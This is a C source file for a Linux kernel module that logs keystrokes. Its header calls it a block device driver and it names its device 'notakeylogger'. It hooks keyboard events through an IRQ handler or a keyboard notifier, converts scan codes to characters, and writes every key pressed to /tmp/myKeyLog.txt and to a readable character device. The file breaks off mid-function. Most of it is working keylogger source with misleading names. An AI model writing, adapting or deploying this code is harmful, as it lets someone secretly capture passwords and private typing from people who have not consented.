/*
 *    PURPOSE - A block device driver for a virtual block device of my own creation
 */

////////////
/* MACROS */
////////////

// GENERAL //
#define DEVICE_NAME "My Key Logger"            // Use this macro for logging
#define CHRDEV_NAME "My Log Device"            // Use this macro to log the character device
#define BUFF_SIZE 16                           // Size of the out buffer
#ifndef TRUE
#define TRUE 1
#endif  // TRUE
#ifndef FALSE
#define FALSE 0
#endif  // FALSE

// LOGGING //
#define DEF_LOG_FILENAME "/tmp/myKeyLog.txt"
#define DEF_LOG_FLAGS O_WRONLY | O_CREAT | O_APPEND
#define DEF_LOG_PERMS S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH
#define DEF_LOG_INIT_MSG "***INITIALIZING LOG***\n"
#define DEF_LOG_CLOSE_MSG "\n***CLOSING LOG***\n"

#define SOLUTION 2
#if SOLUTION == 1
// SOLUTION #1 - ISR4IRQ
// Intel-specific magic numbers
#define KEYBOARD_IRQ 1
#define KBD_STATUS_REG 0x64
#define KBD_CNTL_REG 0x64
#define KBD_DATA_REG 0x60
#else
// Placeholder SOLUTION 2
#endif  // SOLUTION

// CHAR DEVICE //
#define CDEV_BUFF_SIZE 511

/////////////
/* HEADERS */
/////////////
// Do not change the order of these includes unless you want:
// ./arch/x86/include/asm/uaccess.h:28:26: error: dereferencing pointer to incomplete type ‘struct task_struct’
#include <asm/current.h>                        // current
#include <linux/cred.h>                         // ???

#include <asm/uaccess.h>                        // get_fs(), set_fs()
#include "HarkleKerror.h"                       // Kernel error macros
#include <linux/cdev.h>                         // cdev available
#include <linux/fcntl.h>                        // filp_open(), filp_close()
#include <linux/fs.h>                           // Defines file table structures
#include <linux/kernel.h>                       // ALWAYS NEED
#include <linux/module.h>                       // ALWAYS NEED
#include <linux/semaphore.h>                    // semaphores
#include <linux/stat.h>                         // File mode macros
#include <linux/uaccess.h>                      // copy_to_user

#if SOLUTION == 1
#include <linux/interrupt.h>                    // irq_handler_t
#else
#include <linux/keyboard.h>                     // register_keyboard_notifier(), unregister_keyboard_notifier()
#endif  // SOLUTION

//////////////
/* TYPEDEFS */
//////////////
typedef struct _myKeyLogger
{
    struct file *log_fp;
    loff_t logOffset;
    unsigned char keyStr[BUFF_SIZE + 1];
} myKeyLogger, *myKeyLogger_ptr;

typedef struct _myLogDevice
{
    char logBuf[CDEV_BUFF_SIZE + 1];
    size_t bufLength;
    struct semaphore openSem;                   // No more than one user
    struct semaphore busySem;                   // One modifcation to the buffer at a time
    dev_t dev_num;                              // Will hold device number that kernel gives us
    int major_num;                              // Major number assigned to the device
    int minor_num;                              // Minor number assigned to the device
} myLogDevice, *myLogDevice_ptr;

/////////////////////////
/* FUNCTION PROTOTYPES */
/////////////////////////
// PURPOSE - LKM init function
static int __init key_logger_init(void);
// PURPOSE - LKM exit function
static void __exit key_logger_exit(void);
// PURPOSE - Return a file pointer to fileName_ptr with given flags and permissions
static struct file* open_log(const char *fileName_ptr, int flags, int rights);
// PURPOSE - Close a file pointer
static void close_log(struct file *logFile_fp);
// PURPOSE - Write data to an open file*
// RETURN - Number of bytes written on success, -1 on failure
static int write_log(struct file *logFile_fp, unsigned char *data, unsigned int size, unsigned long long offset);
// PURPOSE - Translate scan code to 'key' string
// RETURN - 1 for unsupported value, 0 on success, -1 on failure
static int translate_code(unsigned char scanCode, char *buf);
#if SOLUTION == 1
// PURPOSE - Keyboard IRQ handler
irq_handler_t kb_irq_handler(int irq, void *dev_id, struct pt_regs *regs);  // SOLUTION #1 - ISR4IRQ
// PURPOSE - Converts scancode to key and writes it to log file
void tasklet_logger(unsigned long data);
// Registers the tasklet for logging keys.
// NOTE: Apparently, it must immediately follow the prototype but precede the definition.
// Likely because this macro expands to another function prototype.
DECLARE_TASKLET(my_tasklet, tasklet_logger, 0);  // SOLUTION #1 - ISR4IRQ
#else
// PURPOSE - Respond to a key press notification
int kl_module(struct notifier_block *notifBlock, unsigned long code, void *_param);
#endif  // SOLUTION
// PURPOSE - fops.open for the character device
// INPUT
//  inode - reference to the file on disk and contains information about that file
//  filp - represents an abstract open file
int device_open(struct inode *inode, struct file *filp);
ssize_t device_read(struct file* filp, char* bufStoreData, size_t bufCount, loff_t* curOffset);
// PURPOSE - fops.write for the character device
// NOTE - Is it bad that I'm defining a do-nothing write function?  Should I just leave fops.write == NULL?
ssize_t device_write(struct file* filp, const char* bufSourceData, size_t bufCount, loff_t* curOffset);
int device_close(struct inode *inode, struct file *filp);
// PURPOSE - Write the contents of srcBuf to dstDev.logBuf with care for buffer overruns
// OUTPUT - Number of characters printed on success, -1 on failure
static int write_to_chrdev(myLogDevice_ptr dstDev, char *srcBuf);

/////////////
/* GLOBALS */
/////////////
myKeyLogger myKL;
myLogDevice myLD;
int shift;
#if SOLUTION == 1
unsigned char sCode;  // SOLUTION #1 - ISR4IRQ
#else
// Register this with the keyboard driver
static struct notifier_block kl_notif_block = { .notifier_call = kl_module };
#endif  // SOLUTION
struct cdev *myCdev;            // My character device driver
// This tells the kernel which functions to call when a user operates on our device file_operations
struct file_operations fops =
{
    .owner = THIS_MODULE,       // Prevent unloading of this module when operations are in use
    .open = device_open,        // Points to the method to call when opening the device
    .release = device_close,    // Points to the method to call when closing the device
    .write = device_write,      // Points to the method to call when writing to the device
    .read = device_read         // Points to the method to call when reading from the device
};
static struct class *cfake_class = NULL;

//////////////////////////
/* FUNCTION DEFINITIONS */
//////////////////////////
static int __init key_logger_init(void)
{
    int retVal = 0;
    // unsigned char i = 0;  // DEBUGGING
    int tempRetVal = 0;  // write_log() return value
    int msgLen = strlen(DEF_LOG_INIT_MSG);  // Length of init message
    struct device *device = NULL;  // device_create() return value
    
    HARKLE_KINFO(DEVICE_NAME, "Key logger loading");  // DEBUGGING

    // Initialize Globals
    // 1. Initialize myKeyLogger struct
    myKL.log_fp = NULL;
    myKL.logOffset = 0;
    memset(myKL.keyStr, 0x0, BUFF_SIZE * sizeof(char));
    // 2. shift
    shift = FALSE;

    // DEBUGGING
    // for (i = 0; i <= 85; i++)
    // {
    //     translate_code(i, myKL.keyStr);
    // }

    // Prepare Key Logging File
    myKL.log_fp = open_log(DEF_LOG_FILENAME, DEF_LOG_FLAGS, DEF_LOG_PERMS);

    if (!(myKL.log_fp))
    {
        retVal = -1;
        HARKLE_KERROR(DEVICE_NAME, key_logger_init, "open_log() failed");  // DEBUGGING
    }
    else
    {
        HARKLE_KINFO(DEVICE_NAME, "File opened");  // DEBUGGING

        // NOTE: Getting errors here.  Work on making the logger append to the file later.
        // http://www.ouah.org/mammon_kernel-mode_read_hack.txt
        // myKL.logOffset = myKL.log_fp->f_pos;
        // printk(KERN_INFO "%s: File offset of %s is %ld\n", DEVICE_NAME, DEF_LOG_FILENAME, myKL.logOffset);  // DEBUGGING

        tempRetVal = write_log(myKL.log_fp, DEF_LOG_INIT_MSG, msgLen, myKL.logOffset);

        if (tempRetVal == strlen(DEF_LOG_INIT_MSG))
        {
            myKL.logOffset += msgLen;
        }
        else if (tempRetVal > 0)
        {
            myKL.logOffset += tempRetVal;
        }
        else
        {
            retVal = -1;
            HARKLE_KERROR(DEVICE_NAME, key_logger_init, "write_log() failed");  // DEBUGGING
        }
    }

    if (!retVal)
    {
#if SOLUTION == 1
        // Request to register a shared IRQ handler (ISR).
        retVal = request_irq(KEYBOARD_IRQ, (irq_handler_t)kb_irq_handler, IRQF_SHARED, DEVICE_NAME, &sCode);

        if (!retVal)
        {
            HARKLE_KFINFO(DEVICE_NAME, key_logger_init, "ISR registered");  // DEBUGGING
        }
        else
        {
            HARKLE_KERROR(DEVICE_NAME, key_logger_init, "request_irq() failed to register a shared IRQ handler");  // DEBUGGING
        }
#else
        /*
         * Add to the list of console keyboard event
         * notifiers so the callback is
         * called when an event occurs.
         */
        register_keyboard_notifier(&kl_notif_block);
#endif  // SOLUTION
    }

    // Setup character device
    // 1. Prepare the struct
    if (!retVal)
    {
        HARKLE_KINFO(CHRDEV_NAME, "Preparing character device");  // DEBUGGING

        // Initialize the semaphores
        sema_init(&myLD.openSem, 1);
        sema_init(&myLD.busySem, 1);

        // Memset the buffer
        memset(myLD.logBuf, 0x0, CDEV_BUFF_SIZE + 1);

        // Set buf length
        myLD.bufLength = 0;
    }

    // 2. Get a major number for our device
    if (!retVal)
    {
        // Use dynamic allocation to assign our device a major number
        // alloc_chrdev_region(dev_t*, uint fminor, uint count, char* name)
        retVal = alloc_chrdev_region(&(myLD.dev_num), 0, 1, CHRDEV_NAME);
        if (retVal < 0)
        {
            HARKLE_KERROR(CHRDEV_NAME, key_logger_init, "Failed to allocate a major number for the character device");
        }
        else
        {
            // printk(KERN_DEBUG "%s: alloc_chrdev_region() returned %d\n", CHRDEV_NAME, retVal);  // DEBUGGING
            myLD.major_num = MAJOR(myLD.dev_num);
            myLD.minor_num = MINOR(myLD.dev_num);
            // printk(KERN_INFO "%s: Major number is %d\n", CHRDEV_NAME, myLD.major_num);  // DEBUGGING
            // printk(KERN_INFO "%s: Minor number is %d\n", CHRDEV_NAME, myLD.minor_num);  // DEBUGGING
            retVal = 0;
        }
    }

    // 3. Create device class (before allocation of the array of devices)
    if (!retVal)
    {
        cfake_class = class_create(THIS_MODULE, CHRDEV_NAME);
        if (IS_ERR(cfake_class))
        {
            HARKLE_KERROR(CHRDEV_NAME, key_logger_init, "class_create() failed");  // DEBUGGING
            retVal = PTR_ERR(cfake_class);
        }
    }

    // 4. Allocate and initialize the character device structure
    if (!retVal)
    {
        
        myCdev = cdev_alloc();  // Create our cdev structure
        // Initialize the cdev structure
        if (myCdev)
        {
            // myCdev->ops = &fops;            // Struct file_operations
            // myCdev->owner = THIS_MODULE;    // Very common

            cdev_init(myCdev, &fops);
        }
        else
        {
            HARKLE_KERROR(CHRDEV_NAME, key_logger_init, "Failed to allocate the cdev structure");  // DEBUGGING
            retVal = -1;
        }
    }

    // 5. Add this character device to the system
    if (!retVal)
    {
        retVal = cdev_add(myCdev, myLD.dev_num, 1);

        if (retVal < 0)
        {
            printk(KERN_ALERT "myTestDevice: unable to add cdev to kernel\n");
        }
        else
        {
            // The device is now "live" and can be called by the kernel
            HARKLE_KFINFO(CHRDEV_NAME, key_logger_init, "Character device is now 'live'");
        }
    }

    // 6. Create a device and register it with sysfs 
    if (!retVal)
    {
        // device = device_create(class, NULL, devno, NULL, CFAKE_DEVICE_NAME "%d", minor);
        device = device_create(cfake_class, NULL, myLD.dev_num, NULL, "notakeylogger" "%d", 1);

        if (IS_ERR(device))
        {
            retVal = PTR_ERR(device);
            HARKLE_KERROR(CHRDEV_NAME, key_logger_init, "device_create() failed");
            cdev_del(myCdev);
        }
    }
    
    // DONE
    HARKLE_KINFO(DEVICE_NAME, "Key logger loaded");  // DEBUGGING
    return retVal;
}

static void __exit key_logger_exit(void)
{
    int tempRetVal = 0;  // write_log() return value
    int msgLen = strlen(DEF_LOG_CLOSE_MSG);

    HARKLE_KINFO(DEVICE_NAME, "Key logger unloading");  // DEBUGGING

#if SOLUTION == 1
    // SOLUTION #1 - ISR4IRQ
    // Free the logging tasklet.
    tasklet_kill(&my_tasklet);

    // Free the shared IRQ handler, giving system back original control.
    free_irq(KEYBOARD_IRQ, &sCode);
#else
    unregister_keyboard_notifier(&kl_notif_block);
#endif  // SOLUTION

    // Close Key Logging File
    if (myKL.log_fp)
    {
        // Log final entry
        tempRetVal = write_log(myKL.log_fp, DEF_LOG_CLOSE_MSG, msgLen, myKL.logOffset);

        if (tempRetVal == strlen(DEF_LOG_CLOSE_MSG))
        {
            myKL.logOffset += msgLen;
        }
        else if (tempRetVal > 0)
        {
            myKL.logOffset += tempRetVal;
        }
        else
        {
            HARKLE_KERROR(DEVICE_NAME, key_logger_exit, "write_log() failed");  // DEBUGGING
        }

        // Close file
        close_log(myKL.log_fp);
        myKL.log_fp = NULL;
        HARKLE_KINFO(DEVICE_NAME, "File closed");  // DEBUGGING
    }
    else
    {
        HARKLE_KWARNG(DEVICE_NAME, key_logger_exit, "Logging file pointer was NULL");  // DEBUGGING
    }
    
    // Teardown the character device
    HARKLE_KFINFO(CHRDEV_NAME, key_logger_exit, "Destroying device");  // DEBUGGING
    // device_destroy(class, MKDEV(cfake_major, minor));
    device_destroy(cfake_class, myLD.dev_num);

    HARKLE_KFINFO(CHRDEV_NAME, key_logger_exit, "Deleting device");  // DEBUGGING
    // cdev_del(&dev->cdev);
    cdev_del(myCdev);

    HARKLE_KFINFO(CHRDEV_NAME, key_logger_exit, "Destroying class");  // DEBUGGING
    // class_destroy(cfake_class);
    class_destroy(cfake_class);

    HARKLE_KFINFO(CHRDEV_NAME, key_logger_exit, "Unregistering character device");  // DEBUGGING
    // unregister_chrdev_region(MKDEV(cfake_major, 0), cfake_ndevices);
    unregister_chrdev_region(myLD.dev_num, 1);

    // DONE
    HARKLE_KINFO(DEVICE_NAME, "Key logger unloaded");  // DEBUGGING
    return;
}

static struct file* open_log(const char *fileName_ptr, int flags, int rights)
{
    struct file *retVal = NULL;
    mm_segment_t old_fs = get_fs();  // Store the original process address space specification

    // INPUT VALIDATION
    if (!fileName_ptr)
    {
        HARKLE_KERROR(DEVICE_NAME, open_log, "NULL Pointer");  // DEBUGGING
    }
    else if (!(*fileName_ptr))
    {
        HARKLE_KERROR(DEVICE_NAME, open_log, "Empty string");  // DEBUGGING
    }
    else if (O_RDONLY != flags && !(flags & (O_WRONLY | O_RDWR)))
    {
        HARKLE_KERROR(DEVICE_NAME, open_log, "Invalid flags");  // DEBUGGING
    }
    else if (!rights)
    {
        HARKLE_KERROR(DEVICE_NAME, open_log, "Invalid permissions");  // DEBUGGING
    }
    else
    {
        // OPEN FILE
        // 1. Change to kernel process address space
        // set_fs(KERNEL_DS);  // I've seen this but...
        set_fs(get_ds());  // ...the majority wins

        // 2. Open the file
        retVal = filp_open(fileName_ptr, flags, rights);

        // 3. Restore the address specification (regardless of success)
        set_fs(old_fs);

        if (IS_ERR(retVal))
        {
            HARKLE_KERRNO(DEVICE_NAME, open_log, (int)PTR_ERR(retVal));
            retVal = NULL;
        }
    }

    return retVal;
}

static void close_log(struct file *logFile_fp)
{
    if (logFile_fp)
    {
        filp_close(logFile_fp, NULL);
    }

    return;
}

static int write_log(struct file *logFile_fp, unsigned char *data, unsigned int size, unsigned long long offset)
{
    int retVal = 0;
    mm_segment_t oldfs = get_fs();;

    if (!logFile_fp || !data)
    {
        HARKLE_KERROR(DEVICE_NAME, write_log, "NULL Pointer");  // DEBUGGING
        // printk(KERN_DEBUG "%s: Data was %s\n", DEVICE_NAME, data);  // DEBUGGING
        retVal = -1;
    }
    else if (!(*data) || !size)
    {
        HARKLE_KERROR(DEVICE_NAME, write_log, "Empty string");  // DEBUGGING
        // printk(KERN_DEBUG "data == %s\n", data);  // DEBUGGING
        // printk(KERN_DEBUG "size == %u\n", size);  // DEBUGGING
        retVal = -1;
    }
    else
    {
        // set_fs(KERNEL_DS);  // I've seen this but...
        set_fs(get_ds());  // ...the majority wins

        retVal = vfs_write(logFile_fp, data, size, &offset);

        if (retVal != size)
        {
            HARKLE_KWARNG(DEVICE_NAME, write_log, "vfs_write() return value did not match data size");
        }
        else if (retVal > 0)
        {
            // printk(KERN_INFO "%s: vfs_write wrote %d bytes\n", DEVICE_NAME, retVal);
        }
        else
        {
            HARKLE_KFINFO(DEVICE_NAME, write_log, "vfs_write() appears to have failed");
        }

        set_fs(oldfs);
    }

    return retVal;
}

/*
 *  TWO WAYS OF HIJACKING KEYBOARD INPUT
 *
 *  1. Interrupt Service Routine (ISR) for a keyboard Interrupt Request Line (IRQ)
 *      - Works for older versions of the kernel... KERNEL_VERSION(2,4,9)
 *  2. Register a module with the notification list maintained by the keyboard driver
 *      - Appears to be most common
 */

#if SOLUTION == 1
// 1. ISR for a keyboard IRQ
// NOTE: This implementation is adapted from:
// https://github.com/b1uewizard/linux-keylogger/blob/master/kb.c

// SOLUTION #1 - ISR4IRQ
irq_handler_t kb_irq_handler(int irq, void *dev_id, struct pt_regs *regs)
{
    // Receive the scan code
    sCode = inb(KBD_DATA_REG);

    if (sCode)
    {
        // printk(KERN_DEBUG "inb() returned %u\n", sCode);  // DEBUGGING

        /* We want to avoid I/O in an ISR, so schedule a Linux tasklet to
         * write the key to the log file at the next available time in a
         * non-atomic context.
         */
        tasklet_schedule(&my_tasklet);
    }

    return (irq_handler_t)IRQ_HANDLED;
}

/* Converts scancode to key and writes it to log file. */
void tasklet_logger(unsigned long data)
{
    // LOCAL VARIABLES
    int msgLen = 0;  // Length of human readable string from converted scan code
    int tempRetVal = 0;  // translate_code() return value

    // 1. Convert data to string
    tempRetVal = translate_code(sCode, myKL.keyStr);

    if (-1 == tempRetVal)
    // if (translate_code(data, myKL.keyStr))
    {
        HARKLE_KERROR(DEVICE_NAME, tasklet_logger, "translate_code() has failed");  // DEBUGGING
    }
    else if (0 == tempRetVal)
    {
        // 2. Write string to log file
        // static int write_log(struct file *logFile_fp, unsigned char *data, unsigned int size, unsigned long long offset);
        msgLen = strlen(myKL.keyStr);
        // printk(KERN_DEBUG "myKL.keyStr == %s\n", myKL.keyStr);  // DEBUGGING
        // printk(KERN_DEBUG "strlen(myKL.keyStr) == %d\n", msgLen);  // DEBUGGING

        // NOTES:
        //  - msgLen > 0 avoids empty strings (due to unsupported values)
        //  - myKL.log_fp (!= NULL) avoids the final (ENTER) in the queue that comes through after the _exit() is called
        if (msgLen > 0 && myKL.log_fp)
        {
            if (msgLen != write_log(myKL.log_fp, myKL.keyStr, msgLen, myKL.logOffset))
            {
                HARKLE_KERROR(DEVICE_NAME, tasklet_logger, "write_log() has failed");  // DEBUGGING
            }
        }

        // 2. Write the string to the character device
        if (msgLen > 0)
        {
            // static int write_to_chrdev(myLogDevice_ptr dstDev, char *srcBuf);
            tempRetVal = write_to_chrdev(&myLD, myKL.keyStr);
            if (msgLen != tempRetVal)
            // if (msgLen != write_to_chrdev(&myLD, myKL.keyStr))
            {
                HARKLE_KERROR(DEVICE_NAME, tasklet_logger, "write_to_chrdev() has failed");  // DEBUGGING
                printk(KERN_INFO "%s: write_to_chrdev() returned %d\n", DEVICE_NAME, tempRetVal);  // DEBUGGING
                printk(KERN_INFO "%s: The message is of length %d\n", DEVICE_NAME, msgLen);  // DEBUGGING
            }
        }
    }
    else
    {
        // Unsupported value
        // printk(KERN_DEBUG "Skipping unsupported value of %u\n", sCode);  // DEBUGGING
    }

    // DONE
    return;
}
#else
int kl_module(struct notifier_block *notifBlock, unsigned long code, void *_param)
{
    // LOCAL VARIABLES
    int retVal = 0;
    int msgLen = 0;  // Length of human readable string from converted scan code
    struct keyboard_notifier_param *param = _param;
    int tempRetVal = 0;  // translate_code() return value

    if (!notifBlock || !_param)
    {
        retVal = NOTIFY_BAD;
        HARKLE_KERROR(DEVICE_NAME, kl_module, "NULL pointer");  // DEBUGGING
    }
    else if (!(param->down))
    {
        retVal = NOTIFY_OK;  // We don't care unless a key is being pressed down
    }
    // NOTES
    // 1. I'm sure about the differences between KBD_KEYCODE, KBD_UNBOUND_KEYCODE, KBD_KEYSYM, and KBD_POST_KEYSYM
    // but I'm seeing all four values come through in the "code" parameter
    // 2. Observation tells me I only want the KBD_KEYCODE codes (whatever those are)
    // 3. Not a lot of information to find on the matter but I found the macros here:
    // https://elixir.bootlin.com/linux/latest/source/include/linux/notifier.h
    else if (KBD_KEYCODE == code)
    {
        // printk(KERN_DEBUG "%s: code: 0x%lx, down: 0x%x, shift: 0x%x, value: 0x%x\n", DEVICE_NAME, code, param->down, param->shift, param->value);  // DEBUGGING

        // 0. Set shift key
        if (param->shift)
        {
            shift = 1;
        }
        else
        {
            shift = 0;
        }

        // 1. Convert data to string
        tempRetVal = translate_code(param->value, myKL.keyStr);

        if (-1 == tempRetVal)
        {
            HARKLE_KERROR(DEVICE_NAME, kl_module, "translate_code() has failed");  // DEBUGGING
        }
        else if (0 == tempRetVal)
        {
            // 2. Write string to log file
            msgLen = strlen(myKL.keyStr);

            // NOTES:
            //  - msgLen > 0 avoids empty strings (due to unsupported values)
            //  - myKL.log_fp (!= NULL) avoids the final (ENTER) in the queue that comes through after the _exit() is called
            if (msgLen > 0 && myKL.log_fp)
            {
                if (msgLen != write_log(myKL.log_fp, myKL.keyStr, msgLen, myKL.logOffset))
                {
                    HARKLE_KERROR(DEVICE_NAME, tasklet_logger, "write_log() has failed");  // DEBUGGING
                }
            }

            // 2. Write the string to the character device
            if (msgLen > 0)
            {
                // static int write_to_chrdev(myLogDevice_ptr dstDev, char *srcBuf);
                tempRetVal = write_to_chrdev(&myLD, myKL.keyStr);
                if (msgLen != tempRetVal)
                // if (msgLen != write_to_chrdev(&myLD, myKL.keyStr))
                {
                    HARKLE_KERROR(DEVICE_NAME, tasklet_logger, "write_to_chrdev() has failed");  // DEBUGGING
                    printk(KERN_INFO "%s: write_to_chrdev() returned %d\n", DEVICE_NAME, tempRetVal);  // DEBUGGING
                    printk(KERN_INFO "%s: The message is of length %d\n", DEVICE_NAME, msgLen);  // DEBUGGING
                }
            }
        }
        else
        {
            // Unsupported value
            // printk(KERN_DEBUG "%s: Skipping unsupported value of %u\n", DEVICE_NAME, param->value);  // DEBUGGING
        }
    }
    else
    {
        // We don't want this event, whatever it is
        // printk(KERN_DEBUG "%s: Skipping event 0x%lx", DEVICE_NAME, code);  // DEBUGGING
    }

    return retVal;
}
#endif  // SOLUTION

static int translate_code(unsigned char scanCode, char *buf)
{
    int retVal = 0;
    char *tempRetVal = NULL;

    if (buf)
    {
        // 1. Zeroize the buffer
        memset(buf, 0x0, BUFF_SIZE);

        // 2. Translate and copy in the string
        // This switch statement was lifted from:
        // https://github.com/b1uewizard/linux-keylogger/blob/master/kb.c
        switch(scanCode)
        {
            case 0:
                tempRetVal = buf; break;
            case 1:
                tempRetVal = strncpy(buf, "(ESC)", BUFF_SIZE); break;
            case 2:
                tempRetVal = strncpy(buf, (shift) ? "!" : "1", BUFF_SIZE); break;
            case 3:
                tempRetVal = strncpy(buf, (shift) ? "@" : "2", BUFF_SIZE); break;
            case 4:
                tempRetVal = strncpy(buf, (shift) ? "#" : "3", BUFF_SIZE); break;
            case 5:
                tempRetVal = strncpy(buf, (shift) ? "$" : "4", BUFF_SIZE); break;
            case 6:
                tempRetVal = strncpy(buf, (shift) ? "%" : "5", BUFF_SIZE); break;
            case 7:
                tempRetVal = strncpy(buf, (shift) ? "^" : "6", BUFF_SIZE); break;
            case 8:
                tempRetVal = strncpy(buf, (shift) ? "&" : "7", BUFF_SIZE); break;
            case 9:
                tempRetVal = strncpy(buf, (shift) ? "*" : "8", BUFF_SIZE); break;
            case 10:
                tempRetVal = strncpy(buf, (shift) ? "(" : "9", BUFF_SIZE); break;
            case 11:
                tempRetVal = strncpy(buf, (shift) ? ")" : "0", BUFF_SIZE); break;
            case 12:
                tempRetVal = strncpy(buf, (shift) ? "_" : "-", BUFF_SIZE); break;
            case 13:
                tempRetVal = strncpy(buf, (shift) ? "+" : "=", BUFF_SIZE); break;
            case 14:
                tempRetVal = strncpy(buf, "(BACK)", BUFF_SIZE); break;
            case 15:
                tempRetVal = strncpy(buf, "(TAB)", BUFF_SIZE); break;
            case 16:
                tempRetVal = strncpy(buf, (shift) ? "Q" : "q", BUFF_SIZE); break;
            case 17:
                tempRetVal = strncpy(buf, (shift) ? "W" : "w", BUFF_SIZE); break;
            case 18:
                tempRetVal = strncpy(buf, (shift) ? "E" : "e", BUFF_SIZE); break;
            case 19:
                tempRetVal = strncpy(buf, (shift) ? "R" : "r", BUFF_SIZE); break;
            case 20:
                tempRetVal = strncpy(buf, (shift) ? "T" : "t", BUFF_SIZE); break;
            case 21:
                tempRetVal = strncpy(buf, (shift) ? "Y" : "y", BUFF_SIZE); break;
            case 22:
                tempRetVal = strncpy(buf, (shift) ? "U" : "u", BUFF_SIZE); break;
            case 23:
                tempRetVal = strncpy(buf, (shift) ? "I" : "i", BUFF_SIZE); break;
            case 24:
                tempRetVal = strncpy(buf, (shift) ? "O" : "o", BUFF_SIZE); break;
            case 25:
                tempRetVal = strncpy(buf, (shift) ? "P" : "p", BUFF_SIZE); break;
            case 26:
                tempRetVal = strncpy(buf, (shift) ? "{" : "[", BUFF_SIZE); break;
            case 27:
                tempRetVal = strncpy(buf, (shift) ? "}" : "]", BUFF_SIZE); break;
            case 28:
                tempRetVal = strncpy(buf, "(ENTER)", BUFF_SIZE); break;
            case 29:
                tempRetVal = strncpy(buf, "(CTRL)", BUFF_SIZE); break;
            case 30:
                tempRetVal = strncpy(buf, (shift) ? "A" : "a", BUFF_SIZE); break;
            case 31:
                tempRetVal = strncpy(buf, (shift) ? "S" : "s", BUFF_SIZE); break;
            case 32:
                tempRetVal = strncpy(buf, (shift) ? "D" : "d", BUFF_SIZE); break;
            case 33:
                tempRetVal = strncpy(buf, (shift) ? "F" : "f", BUFF_SIZE); break;
            case 34:
                tempRetVal = strncpy(buf, (shift) ? "G" : "g", BUFF_SIZE); break;
            case 35:
                tempRetVal = strncpy(buf, (shift) ? "H" : "h", BUFF_SIZE); break;
            case 36:
                tempRetVal = strncpy(buf, (shift) ? "J" : "j", BUFF_SIZE); break;
            case 37:
                tempRetVal = strncpy(buf, (shift) ? "K" : "k", BUFF_SIZE); break;
            case 38:
                tempRetVal = strncpy(buf, (shift) ? "L" : "l", BUFF_SIZE); break;
            case 39:
                tempRetVal = strncpy(buf, (shift) ? ":" : ";", BUFF_SIZE); break;
            case 40:
                tempRetVal = strncpy(buf, (shift) ? "\"" : "'", BUFF_SIZE); break;
            case 41:
                tempRetVal = strncpy(buf, (shift) ? "~" : "`", BUFF_SIZE); break;
            case 42:
            case 54:
                shift = 1; tempRetVal = buf; break;
            case 170:
            case 182:
                shift = 0; tempRetVal = buf; break;
            case 43:
                tempRetVal = strncpy(buf, (shift) ? "\\" : "|", BUFF_SIZE); break;
            case 44:
                tempRetVal = strncpy(buf, (shift) ? "Z" : "z", BUFF_SIZE); break;
            case 45:
                tempRetVal = strncpy(buf, (shift) ? "X" : "x", BUFF_SIZE); break;
            case 46:
                tempRetVal = strncpy(buf, (shift) ? "C" : "c", BUFF_SIZE); break;
            case 47:
                tempRetVal = strncpy(buf, (shift) ? "V" : "v", BUFF_SIZE); break;
            case 48:
                tempRetVal = strncpy(buf, (shift) ? "B" : "b", BUFF_SIZE); break;
            case 49:
                tempRetVal = strncpy(buf, (shift) ? "N" : "n", BUFF_SIZE); break;
            case 50:
                tempRetVal = strncpy(buf, (shift) ? "M" : "m", BUFF_SIZE); break;
            case 51:
                tempRetVal = strncpy(buf, (shift) ? "<" : ",", BUFF_SIZE); break;
            case 52:
                tempRetVal = strncpy(buf, (shift) ? ">" : ".", BUFF_SIZE); break;
            case 53:
                tempRetVal = strncpy(buf, (shift) ? "?" : "/", BUFF_SIZE); break;
            case 56:
                tempRetVal = strncpy(buf, "(R-ALT)", BUFF_SIZE); break;
            case 69:
                tempRetVal = strncpy(buf, "(NUM)", BUFF_SIZE); break;
            /* Space */
            case 55:
            case 57:
            case 58:
            case 59:
            case 60:
            case 61:
            case 62:
            case 63:
            case 64:
            case 65:
            case 66:
            case 67:
            case 68:
            case 70:
            case 71:
            case 72:
                tempRetVal = strncpy(buf, " ", BUFF_SIZE); break;
            case 73:
                tempRetVal = strncpy(buf, "(PGUP)", BUFF_SIZE); break;
            case 74:
                tempRetVal = strncpy(buf, "-", BUFF_SIZE); break;
            case 75:
                tempRetVal = strncpy(buf, "(LEFT)", BUFF_SIZE); break;
            case 76:
                tempRetVal = strncpy(buf, "(KPD5)", BUFF_SIZE); break;
            case 77:
                tempRetVal = strncpy(buf, "(RIGHT)", BUFF_SIZE); break;
            case 78:
                tempRetVal = strncpy(buf, "+", BUFF_SIZE); break;
            case 79:
                tempRetVal = strncpy(buf, "(END)", BUFF_SIZE); break;
            case 80:
                tempRetVal = strncpy(buf, "(DOWN)", BUFF_SIZE); break;
            case 81:
                tempRetVal = strncpy(buf, "(PGDN)", BUFF_SIZE); break;
            case 82:
                tempRetVal = strncpy(buf, "(INS)", BUFF_SIZE); break;
            case 83:
                tempRetVal = strncpy(buf, "(DEL)", BUFF_SIZE); break;
            case 84:
                tempRetVal = strncpy(buf, "(SYSRQ)", BUFF_SIZE); break;
            default:
                // printk(KERN_INFO "%s: translate_code() received unsupported scan code of %u.\n", DEVICE_NAME, scanCode);  // DEBUGGING
                retVal = 1;
                tempRetVal = buf;
                break;
        }

        if (tempRetVal != buf || NULL == tempRetVal)
        {
            retVal = -1;
        }
        else if (*tempRetVal)
        {
            // printk(KERN_INFO "%s: Translated %u into '%s'\n", DEVICE_NAME, scanCode, buf);  // DEBUGGING
        }
    }
    else
    {
        HARKLE_KERROR(DEVICE_NAME, translate_code, "NULL pointer");  // DEBUGGING
    }

    return retVal;
}

///////////////////////////////////////////////////////////////////////////////////////////////////
//////////////////////////////////// CHARACTER DEVICE FUNCTIONS ///////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////////

int device_open(struct inode *inode, struct file *filp)
{
    int retVal = 0;

    // Only allow one process to open this device by using a semaphore as mutal exclusive lock - mutext
    retVal = down_interruptible(&myLD.openSem);
    if (retVal != 0)
    {
        printk(KERN_ALERT "%s: Unable to lock device during open\n", CHRDEV_NAME);  // DEBUGGING
        retVal = -1;
    }
    else
    {
        HARKLE_KFINFO(CHRDEV_NAME, device_open, "Opened device");  // DEBUGGING
    }

    return retVal;
}

ssize_t device_read(struct file* filp, char* bufStoreData, size_t bufCount, loff_t* curOffset)
{
    // LOCAL VARIABLES
    unsigned long tempRetVal = 0;  // Return value from copy_to_user
    ssize_t retVal = 0;  // Number of bytes read
    size_t numBytesToRead = 0;  // Smallest between bufCount and myLD.bufOffset
    int i = 0;  // Index into logBuf

    if (!filp || !bufStoreData || !curOffset)
    {
